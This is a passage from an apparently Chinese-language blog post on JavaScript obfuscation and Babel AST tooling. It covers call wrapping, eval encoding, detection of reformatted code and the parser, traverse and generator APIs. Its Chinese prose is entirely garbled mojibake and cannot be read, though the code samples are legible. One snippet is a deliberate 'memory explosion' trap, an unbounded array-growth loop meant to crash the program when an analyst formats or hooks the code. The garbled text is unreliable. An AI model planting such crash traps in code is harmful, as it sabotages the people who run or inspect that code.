1èµ‹å€¼ç»™b<br>åŒç†ï¼Œå¦‚æœsubæ”¹ä¸ºobj.addçš„è¯ï¼Œå¯ä»¥å¤„ç†æˆ<code>(a=1000,obj.add)(a,3000)</code>ï¼Œæˆ–è€…<code>(a=1000,obj).add(a,3000)</code></li></ul><p>ç¬¬äºŒç§æ–¹æ³•æ˜¯è°ƒç”¨è¡¨è¾¾å¼åœ¨ç­‰å·å³è¾¹çš„æƒ…å†µï¼Œä¾‹å¦‚testä¸­ç¬¬ä¸‰å¥ï¼Œé‡Œé¢çš„b+obj.add(b,2000)ï¼Œå¯ä»¥å¯¹obj.addè¿›è¡ŒåŒ…è£…ï¼Œå¤„ç†æˆ<code>b+(0,obj.add)(b,2000)</code>æˆ–è€…<code>b+(0,obj).add(b,2000)</code>,æ‹¬å·ä¸­0å¯ä»¥æ¢æˆèŠ±æŒ‡ä»¤</p><h2 id="å…¶ä»–ä»£ç é˜²æŠ¤æ–¹æ¡ˆ">å…¶ä»–ä»£ç é˜²æŠ¤æ–¹æ¡ˆ</h2><h3 id="evalåŠ å¯†">evalåŠ å¯†</h3><p>evalåŠ å¯†ç½‘å€ï¼š<a href="http://www.jqueryfuns.com/tools/jsencode">http://www.jqueryfuns.com/tools/jsencode</a></p><p>evalå…¨å±€å‡½æ•°ï¼ŒæŠŠä¸€æ®µå­—ç¬¦ä¸²å½“åšä»£ç æ‰§è¡Œã€‚</p><h3 id="å†…å­˜çˆ†ç ´">å†…å­˜çˆ†ç ´</h3><p>æ˜¯åœ¨ä»£ç ä¸­åŠ å…¥æ­»ä»£ç ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œè¿™æ®µä»£ç ä¸æ‰§è¡Œï¼Œå½“æ£€æµ‹å‡½æ•°è¢«æ ¼å¼åŒ–æˆ–è€…å‡½æ•°è¢«Hookå°±è·³è½¬åˆ°è¿™æ®µä»£ç æ‰§è¡Œï¼Œè¿™é“å†…å­˜æº¢å‡ºç¨‹åºå´©æºƒ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> d=[<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x0</span>];</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">b</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0x0</span>,c=d.<span class="property">length</span>;i&lt;c;i++)&#123;</span><br><span class="line">        d.<span class="title function_">push</span>(<span class="title class_">Math</span>.<span class="title function_">round</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()));</span><br><span class="line">        c=d.<span class="property">length</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ£€æµ‹ä»£ç æ˜¯å¦æ ¼å¼åŒ–">æ£€æµ‹ä»£ç æ˜¯å¦æ ¼å¼åŒ–</h3><p>åœ¨jsä¸­ï¼Œå‡½æ•°æ˜¯å¯ä»¥è½¬ä¸ºå­—ç¬¦ä¸²çš„ã€‚å› æ­¤å¯ä»¥é€‰æ‹©ä¸€ä¸ªå‡½æ•°è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ç„¶åè·Ÿå†…ç½®å­—ç¬¦ä¸²å¯¹æ¯”æˆ–ç”¨æ­£åˆ™åŒ¹é…ã€‚æ²¡æœ‰åŒ¹é…ä¸Šå°±è¯´æ˜è¢«æ ¼å¼åŒ–äº†</p><p>å‡½æ•°è½¬å­—ç¬¦ä¸²å¦‚ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(add+<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(add.<span class="title function_">toString</span>());</span><br><span class="line"><span class="comment">//&quot;function add(a,b)&#123;return a+b;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>åœ¨Chromeä¸­ï¼ŒæŠŠä»£ç æ ¼å¼åŒ–åä¼šäº§ç”Ÿä¸€ä¸ªåç¼€ä¸º<code>formatted</code>çš„æ–‡ä»¶ï¼Œä¹‹åè¿™ä¸ªæ–‡ä»¶ä¸­è®¾ç½®æ–­ç‚¹ï¼Œè§¦å‘æ–­ç‚¹ï¼Œä¼šåœåœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯è¿™æ—¶æŠŠæŸä¸ªå‡½æ•°è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œå–åˆ°çš„ä¾ç„¶æ˜¯æ ¼å¼åŒ–ä¹‹å‰çš„ä»£ç ï¼Œè¿™ç§æ£€æµ‹æ–¹æ³•æ£€æµ‹ä¸åˆ°è¿™ç§æƒ…å†µï¼Œé‚£ä¹ˆè¿™ç§æ£€æµ‹æ–¹æ³•åº”ç”¨åœºæ™¯å¦‚ä½•ï¼Ÿ</p><p>åœ¨åˆ†æå®Œç®—æ³•æƒ³è¦è·å¾—ç»“æœï¼Œä¼šé€‰æ‹©ç›´æ¥ä¿®æ”¹æºæ–‡ä»¶ï¼Œç„¶åè¿è¡Œç»“æœï¼ŒæŠŠæ ¼å¼åŒ–åä»£ç ä¿å­˜æˆä¸€ä¸ªæœ¬åœ°æ–‡ä»¶ï¼Œè¿™æ—¶æŸä¸ªå‡½æ•°è½¬åŒ–ä¸ºå­—ç¬¦ä¸²å–åˆ°çš„å°±æ˜¯æ ¼å¼åŒ–åçš„ç»“æœ</p><p>å¦‚æœæ£€æµ‹æ ¼å¼åŒ–ï¼Œå¯ä»¥è·³åˆ°å†…å­˜çˆ†ç ´ä¸­</p><h1>ASTçš„APIè¯¦è§£</h1><h2 id="ASTå…¥é—¨">ASTå…¥é—¨</h2><h3 id="ASTåŸºæœ¬ç»“æ„">ASTåŸºæœ¬ç»“æ„</h3><p>ç»è¿‡Babelè§£æï¼Œé‡Œé¢çš„å…ƒç´ å«åšèŠ‚ç‚¹(Node)ï¼ŒåŒæ—¶Babelæä¾›è®¸å¤šæ–¹æ³•å»æ“ä½œèŠ‚ç‚¹</p><p><strong>æºä»£ç </strong>`</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">    <span class="attr">add</span>:<span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b+<span class="number">1000</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">mul</span>:<span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> a*b+<span class="number">1000</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥åœ¨AST Explorerç½‘ç«™ä¸­å¯¹å…¶è¿›è¡ŒBabelè§£æä¸ºASTï¼Œè§£æåASTæœ‰å¾ˆå¤šå±‚çº§ï¼Œè¿™äº›å±‚çº§äº’ä¸ºçˆ¶å­èŠ‚ç‚¹å¯¹äºè§£æåçš„ç»“æ„æŸ¥çœ‹ç›¸åº”çš„ä¹¦ç±å†…å®¹å³å¯ï¼Œè¿™é‡Œåªæ˜¯è®°å½•ä¸€äº›åŸºç¡€åç§°</p><ul><li>VariableDeclarationï¼šè¡¨ç¤ºæ˜¯å˜é‡å£°æ˜è¯­å¥</li><li>kindï¼šè¡¨ç¤ºå˜é‡å£°æ˜è¯­å¥ä½¿ç”¨çš„å…³é”®å­—</li><li>declarationsï¼šå£°æ˜çš„å…·ä½“å˜é‡ï¼Œæ˜¯ä¸€ä¸ªæ•°ç»„ã€‚</li><li>æ¯ä¸€ä¸ªå˜é‡éƒ½ä»¥VariableDeclaratorè¡¨ç¤º</li><li>VariableDeclaratorçš„å±æ€§ä¸»è¦æ˜¯idå’Œinitï¼Œå¯¹äºinitï¼Œå¦‚æœåªæ˜¯å£°æ˜æ²¡æœ‰åˆå§‹å€¼ï¼Œinitä¸ºnullï¼Œå¦åˆ™initèŠ‚ç‚¹ä¸‹è¿˜æœ‰å†…å®¹</li><li>å¯¹äºä¸Šè¿°åŸå§‹ä»£ç è€Œè¨€ï¼ŒæŠŠå¯¹è±¡å­—é¢é‡èµ‹å€¼ç»™objï¼Œæˆä¸ºObjectExpression(å¯¹è±¡è¡¨è¾¾å¼)ï¼Œæœ‰å¯¹è±¡è‡ªç„¶æœ‰å±æ€§ï¼Œæ‰€ä»¥propertiesæ˜¯æ•°ç»„ï¼Œä¸€ä¸ªå±æ€§å¯¹åº”ä¸€ä¸ªæˆå‘˜ï¼ŒæŸ¥çœ‹propertiesä¸‹å†…å®¹</li><li>ObjectPropertyï¼šè¡¨ç¤ºå¯¹è±¡å±æ€§ï¼Œ</li><li>å› ä¸ºå¯¹è±¡æ˜¯é”®å€¼å¯¹ç»„æˆï¼Œåœ¨è¡¨ç¤ºå¯¹è±¡å±æ€§æ—¶ï¼Œä¼šæœ‰keyå’Œvalueä¸¤ä¸ªèŠ‚ç‚¹ï¼Œkeyæ˜¯Identifier(æ ‡è¯†ç¬¦)ï¼Œåå­—æ˜¯nameï¼Œå¯¹è±¡çš„keyä¹Ÿå¯ä»¥ç”¨å­—ç¬¦ä¸²è¡¨ç¤ºï¼Œè¿™æ˜¯keyèŠ‚ç‚¹ç±»å‹å˜ä¸ºStringLiteral(å­—ç¬¦ä¸²å­—é¢é‡)ï¼Œvalueç±»å‹ä¸ºStringLiteral</li><li>extraèŠ‚ç‚¹å¯ä»¥åˆ é™¤</li><li>å¯¹äºå‡½æ•°è¡¨è¾¾å¼èµ‹å€¼ç»™å¯¹è±¡å±æ€§ï¼štypeä¸ºFunctionExpressionï¼Œå‡½æ•°åå¯¹è±¡idèŠ‚ç‚¹ï¼Œç”±äºä»£ç æŠŠä¸€ä¸ªåŒ¿åå‡½æ•°èµ‹å€¼ç»™objçš„addå±æ€§ï¼Œæ‰€ä»¥è¿™é‡Œidä¸ºnullï¼Œå‡½æ•°å‚æ•°å¯¹åº”paramsèŠ‚ç‚¹ï¼Œæ˜¯ä¸ªæ•°ç»„ï¼Œ**å¦‚æœæ²¡å‚æ•°paramsèŠ‚ç‚¹ä¸ºç©ºæ•°ç»„ï¼Œ**å‡½æ•°ä½“å¯¹åº”bodyèŠ‚ç‚¹</li><li>ä¸€èˆ¬å‡½æ•°ä½“éƒ½ä¼šç”¨BlockStatementèŠ‚ç‚¹åŒ…è£¹ï¼Œï¼ŒBlockStatementé‡Œçš„bodyèŠ‚ç‚¹æ˜¯å¤šæ¡è¯­å¥ï¼Œæ‰€ä»¥bodyæ˜¯æ•°ç»„ï¼Œå¦‚æœå‡½æ•°æœ‰&quot;use strict&quot;æ ‡è®°ï¼Œé‚£ä¹ˆdirectivesé‡Œä¼šæœ‰ç›¸åº”èŠ‚ç‚¹</li><li>ReturnStatement(è¿”å›è¯­å¥)</li><li>argumentï¼šå‡½æ•°è¿”å›å†…å®¹ï¼Œæ²¡æœ‰è¿”å›åˆ™ä¸ºnull</li><li>BinaryExpressionï¼šäºŒå…ƒå¼</li><li>NumericLiteralï¼šæ•°å€¼å­—é¢é‡</li></ul><h3 id="ä»£ç åŸºæœ¬ç»“æ„">ä»£ç åŸºæœ¬ç»“æ„</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);   <span class="comment">//è¯»å†™æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">const</span> parser = <span class="built_in">require</span>(<span class="string">&quot;@babel/parser&quot;</span>);  <span class="comment">//@babel/parserï¼šç”¨æ¥å°†jsä»£ç è½¬åŒ–ä¸ºAST</span></span><br><span class="line"><span class="keyword">const</span> traverse = <span class="built_in">require</span>(<span class="string">&quot;@babel/traverse&quot;</span>).<span class="property">default</span>;<span class="comment">//@babel/traverse:éå†astä¸­çš„èŠ‚ç‚¹</span></span><br><span class="line"><span class="keyword">const</span> t = <span class="built_in">require</span>(<span class="string">&quot;@babel/types&quot;</span>);            <span class="comment">//@babel/typesï¼šåˆ¤æ–­èŠ‚ç‚¹ç±»å‹ï¼Œç”Ÿæˆæ–°çš„èŠ‚ç‚¹ç­‰</span></span><br><span class="line"><span class="keyword">const</span> generator = <span class="built_in">require</span>(<span class="string">&quot;@babel/generator&quot;</span>).<span class="property">default</span>;  <span class="comment">//astè½¬åŒ–ä¸ºjs</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> jscode = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;./demo.js&quot;</span>, &#123;</span><br><span class="line"><span class="attr">encoding</span>: <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">  &#125;);</span><br><span class="line"><span class="keyword">let</span> ast = parser.<span class="title function_">parse</span>(jscode);</span><br><span class="line"></span><br><span class="line"><span class="comment">//åœ¨è¿™é‡Œå¯¹ASTè¿›è¡Œä¸€ç³»åˆ—çš„æ“ä½œ</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> code = <span class="title function_">generator</span>(ast).<span class="property">code</span>;</span><br><span class="line">fs.<span class="title function_">writeFile</span>(<span class="string">&#x27;./demoNew.js&#x27;</span>, code, <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;&#125;);</span><br></pre></td></tr></table></figure><p><strong>ASTå¤„ç†JSåŸºæœ¬æ­¥éª¤</strong></p><ul><li>è¯»å–jsæ–‡ä»¶è§£æä¸ºAST</li><li>å¯¹èŠ‚ç‚¹å¢åˆ æ”¹æŸ¥</li><li>ç”Ÿæˆjsä»£ç </li></ul><p><strong>åç»­å†…å®¹æ²¡æœ‰ç‰¹æ®Šè¯´æ˜éƒ½ä»¥è¿™ä¸ªç»“æ„ä¸ºå‡†ï¼Œä»£ç åªå±•ç°ä¸­é—´å¯¹astæœ‰æ“ä½œçš„éƒ¨åˆ†</strong></p><h2 id="Babelä¸­çš„ç»„ä»¶">Babelä¸­çš„ç»„ä»¶</h2><p>Babelçš„ç¼–è¯‘è¿‡ç¨‹ä¸»è¦ä»¥ä¸‹ä¸‰ä¸ªé˜¶æ®µ</p><ul><li>è§£æï¼šå°†è¾“å…¥å­—ç¬¦æµè§£æASTæŠ½è±¡è¯­æ³•æ ‘</li><li>è½¬åŒ–ï¼šå¯¹æŠ½è±¡è¯­æ³•æ ‘è¿›ä¸€æ­¥è½¬åŒ–</li><li>ç”Ÿæˆï¼šæ ¹æ®è½¬åŒ–åçš„è¯­æ³•æ ‘ç”Ÿæˆç›®æ ‡ä»£ç </li></ul><h3 id="Babelçš„è§£æ">Babelçš„è§£æ</h3><p>åŒ…æ‹¬ä¸¤ä¸ªå†…å®¹ï¼šè¯æ³•åˆ†æä¸è¯­æ³•åˆ†æï¼Œç»è¿‡è¿™ä¸€æ­¥ä»¥åï¼Œå¯ä»¥ç›´æ¥å¾—åˆ°è¾“å…¥æºä»£ç çš„ASTæŠ½è±¡è¯­æ³•æ ‘</p><h3 id="Babelçš„è½¬åŒ–">Babelçš„è½¬åŒ–</h3><p>è½¬åŒ–æ­¥éª¤æ¥æ”¶astå¹¶å¯¹å…¶è¿›è¡Œéå†ï¼Œå†æ¬¡è¿‡ç¨‹ä¸­å¯¹èŠ‚ç‚¹è¿›è¡Œæ·»åŠ ï¼Œæ›´æ–°åŠç§»é™¤ç­‰æ“ä½œã€‚åç»­å¯¹æ··æ·†jsä»£ç ä»¥åŠæ··æ·†jsä»£ç çš„è¿˜åŸéƒ½åœ¨æ­¤å¤„ï¼Œ<strong>è¿™æ˜¯æœ¬ä¹¦çš„é‡ç‚¹</strong>ï¼Œä¹‹æ‰€ä»¥å°†å­—ç¬¦æµè½¬åŒ–ä¸ºæŠ½è±¡è¯­æ³•æ ‘ï¼ŒåŸå› æ˜¯æ ‘çŠ¶ç»“æ„æ›´åŠ å®¹æ˜“è¿›è¡ŒåŸå­æ“ä½œï¼Œå¯ä»¥å¯¹ä»»æ„èŠ‚ç‚¹è¿›è¡Œç²¾ç»†åŒ–çš„å¤„ç†ã€‚åœ¨æŠ½è±¡è¯­æ³•æ ‘ä¸­ï¼Œä»£ç è§å¾—å…³ç³»è¢«æŠ½è±¡ä¸ºèŠ‚ç‚¹çš„å…³ç³»ï¼Œè€Œå®ç°ç›¸åŒåŠŸèƒ½çš„èŠ‚ç‚¹ä¹‹é—´çš„è¡¨ç¤ºä¹Ÿæ˜¯ç›¸åŒçš„ï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå¯ä»¥å†è¯­æ³•æ ‘å±‚é¢å¯¹è¾“å…¥çš„ä»£ç è¿›è¡Œå¢åˆ æ”¹æŸ¥ï¼Œè€Œä¸å¿…å…³å¿ƒä»£ç çš„ä¹¦å†™ã€‚åˆ¶å®šå‡ æ¡è§„åˆ™ï¼ŒBabelå°±å¯ä»¥å¯¹æŠ½è±¡è¯­æ³•æ ‘è¿›è¡Œéå†ï¼Œå®Œæˆæ•´ä¸ªä»£ç æ‰¹é‡æ“ä½œ</p><h3 id="Babelçš„ç”Ÿæˆ">Babelçš„ç”Ÿæˆ</h3><p>ä»£ç ç”Ÿæˆæ­¥éª¤æŠŠæœ€ç»ˆçš„astè¯­æ³•æ ‘è½¬æ¢æˆå­—ç¬¦ä¸²å¼çš„ä»£ç ï¼Œä»£ç ç”Ÿæˆå¾ˆç®€å•ï¼šæ·±åº¦ä¼˜å…ˆéå†æ•´ä¸ªASTï¼Œç„¶åæ„å»ºå¯ä»¥è¡¨ç¤ºè½¬åŒ–åä»£ç çš„å­—ç¬¦ä¸²ï¼Œç»è¿‡è¿™ä¸€æ­¥ï¼Œå°±å¯ä»¥å¾—åˆ°ä»astæŠ½è±¡è¯­æ³•å±‚å±‚é¢ä¿®æ”¹è¿‡çš„ä»£ç ã€‚</p><h3 id="parserä¸generator">parserä¸generator</h3><p>parserï¼šå°†JSä»£ç è½¬åŒ–ä¸ºAST  ==&gt; <code>let ast=parser.parse(jscode)</code>è¾“å‡ºå‰ä½¿ç”¨JSON.stringifyæŠŠå¯¹è±¡è½¬ä¸ºjsonæ•°æ®ï¼Œå¦‚<code>JSON.stringify(ast,null,2)</code></p><p>generatorï¼šå°†ASTè½¬åŒ–ä¸ºJS ==ã€‹ <code>let code=generator(ast).code</code>è¿”å› ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ä¸­codeå±æ€§æ‰æ˜¯éœ€è¦çš„ä»£ç ã€‚</p><p>parserçš„parseæ˜¯æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä½†æ˜¯ç¬¬äºŒä¸ªå‚æ•°åœ¨es6ä¸­æ‰éœ€è¦å†™å‡ºæ¥ï¼Œä¾‹å¦‚å½“çœ‹åˆ°jsä»£ç ä¸­æœ‰importï¼Œexportæ—¶ï¼Œå°±éœ€è¦å†™å‡ºç¬¬äºŒä¸ªå‚æ•°ä¸”sourceTypeè¦æŒ‡å®šä¸ºmoduleã€‚(sourceTypeé»˜è®¤ä¸ºscript)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ast = parser.<span class="title function_">parse</span>(jscode,&#123;</span><br><span class="line">    <span class="attr">sourceType</span>:<span class="string">&quot;module&quot;</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>generatorè¿”å›çš„ä¸€ä¸ªå¯¹è±¡ï¼ŒåŒæ—¶ä»–çš„ç¬¬äºŒä¸ªå‚æ•°æ¥çº³ä¸€ä¸ªå¯¹è±¡ï¼Œå¯ä»¥è®¾ç½®ä¸€äº›æ¥å½±å“è¾“å‡ºç»“æœã€‚å¦‚ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> code = <span class="title function_">generator</span>(ast, &#123;</span><br><span class="line"><span class="attr">retainLines</span>: <span class="literal">false</span>, </span><br><span class="line"><span class="attr">comments</span>: <span class="literal">false</span>, </span><br><span class="line"><span class="attr">compact</span>: <span class="literal">true</span></span><br><span class="line">&#125;).<span class="property">code</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(code);</span><br></pre></td></tr></table></figure><p>retainLinesè¡¨ç¤ºæ˜¯å¦ä½¿ç”¨ä¸æºä»£ç ç›¸åŒçš„è¡Œå·ï¼Œé»˜è®¤falseï¼Œè¾“å‡ºçš„æ˜¯æ ¼å¼åŒ–ä¹‹åçš„ä»£ç ã€‚</p><p>commentsè¡¨ç¤ºæ˜¯å¦ä¿ç•™æ³¨é‡Šï¼Œé»˜è®¤trueã€‚</p><p>compactè¡¨ç¤ºæ˜¯å¦å‹ç¼©ä»£ç ï¼Œå…¶ä¸­minifiedå‹ç¼©ç¨‹åº¦æœ€å¤šï¼Œconciseæœ€å°‘</p><h3 id="traverseä¸visitor">traverseä¸visitor</h3><p>traverseç”¨æ¥éå†ASTï¼Œä½†æ˜¯å•çº¯éå†æ²¡æœ‰æ„ä¹‰ï¼Œæ‰€ä»¥é…åˆvisitorä½¿ç”¨ã€‚</p><p><code>visitor</code>æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå¥¹å¯ä»¥ç”¨æ¥å®šä¹‰ä¸€äº›æ–¹æ³•ï¼Œç”¨æ¥è¿‡æ»¤èŠ‚ç‚¹ã€‚</p><p><strong>æ¡ˆä¾‹ç†è§£traverseä¸visitor</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> visitor=&#123;&#125;;</span><br><span class="line">visitor.<span class="property">FunctionExpression</span>=<span class="title function_">funtion</span>(<span class="params">path</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">traverse</span>(ast,visitor);</span><br></pre></td></tr></table></figure><p><strong>åˆ†æ</strong>ï¼šå£°æ˜å¯¹è±¡ï¼Œåå­—éšä¾¿ã€‚å†ç»™å¯¹è±¡å¢åŠ ä¸€ä¸ªåä¸ºFunctionExpressionçš„æ–¹æ³•ï¼Œå®ƒçš„åå­—æ˜¯éœ€è¦éå†çš„èŠ‚ç‚¹çš„ç±»å‹(æ³¨æ„å¤§å°å†™)ã€‚traverseä¼šéå†astæ‰€æœ‰èŠ‚ç‚¹ï¼Œå½“èŠ‚ç‚¹æ˜¯FunctionExpressionç±»å‹ï¼Œè°ƒç”¨visitorä¸­çš„æ–¹æ³•ã€‚visitorä¸­çš„æ–¹æ³•æ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œtraverseåœ¨éå†æ—¶ï¼Œä¼šæŠŠå½“å‰èŠ‚ç‚¹çš„Pathå¯¹è±¡ä¼ ç»™ä»–ã€‚æœ€åæŠŠvisitorä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¼ åˆ°traverseé‡Œï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯astã€‚</p><p><strong>å®šä¹‰visitorçš„ä¸‰ç§æ–¹å¼</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> visitor1=&#123;</span><br><span class="line">    <span class="title class_">FunctionExpression</span>:<span class="keyword">function</span>(<span class="params">path</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æœ€å¸¸ç”¨</span></span><br><span class="line"><span class="keyword">const</span> visitor2=&#123;</span><br><span class="line">    <span class="title class_">FunctionExpression</span>(path)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> visitor3=&#123;</span><br><span class="line">    <span class="title class_">FunctionExpression</span>:&#123;</span><br><span class="line">        <span class="title function_">enter</span>(<span class="params">path</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//åœ¨visitor3ä¸­å­˜åœ¨ä¸€ä¸ªenterï¼Œè¡¨ç¤ºè¿›å…¥èŠ‚ç‚¹æ—¶ï¼Œè¿˜æœ‰ä¸€ä¸ªexit è¡¨ç¤ºé€€å‡ºèŠ‚ç‚¹æ—¶ï¼Œè¿™ä¸¤ä¸ªæ—¶æœºå¯ä»¥è®¿é—®èŠ‚ç‚¹</span></span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥æŠŠæ–¹æ³•åä½¿ç”¨<code>'|'</code>è¿æ¥ï¼Œå¦‚<code>FunctionExpression|BinaryExpression</code>å½¢å¼å­—ç¬¦ä¸²,æŠŠä¸€ä¸ªæ–¹æ³•åº”ç”¨å¯¹ä¸ªèŠ‚ç‚¹ä¸­ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> visitor2=&#123;</span><br><span class="line">    <span class="string">&quot;FunctionExpression | BinaryExpression &quot;</span>(path)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥æŠŠå¤šä¸ªå‡½æ•°åº”ç”¨ä¸€ä¸ªèŠ‚ç‚¹ä¸­ï¼Œå¦‚åŸå…ˆæ˜¯æŠŠä¸€ä¸ªå‡½æ•°èµ‹å€¼ç»™enteræˆ–è€…exitï¼Œç°åœ¨æ”¹ä¸ºå‡½æ•°çš„æ•°ç»„ï¼Œä¼šæŒ‰ç…§é¡ºåºä¾æ¬¡è¿›è¡Œã€‚å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">func1</span>(<span class="params">path</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;func1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func2</span>(<span class="params">path</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;func2&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> visitor3=&#123;</span><br><span class="line">    <span class="title class_">FunctionExpression</span>:&#123;</span><br><span class="line">        <span class="attr">enter</span>:[func1,func2]          </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>traverseå¹¶éå¿…é¡»ä»éå†ï¼Œå®ƒå¯ä»ä»»æ„èŠ‚ç‚¹å‘ä¸‹éå†ï¼Œä¾‹å¦‚æƒ³è¦æŠŠä»£ç ä¸­æ‰€æœ‰å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ”¹ä¸ºx</p><figure class="highlight 